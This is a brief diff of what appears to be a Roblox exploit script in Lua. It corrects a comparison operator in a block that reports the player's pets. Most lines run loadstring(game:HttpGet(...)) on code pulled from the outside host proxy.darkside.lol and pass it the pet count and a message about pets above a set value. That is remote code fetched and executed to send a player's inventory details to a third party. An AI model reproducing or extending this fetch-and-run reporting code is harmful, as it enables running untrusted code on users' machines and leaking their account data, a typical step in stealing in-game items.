@@ -72,7 +72,7 @@ loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(#tab))
 end
 end)
-if big = "" then
+if big == "" then
 big = "No pets over 1/".._G.Min.." :("
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(big)
 loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(#tab))
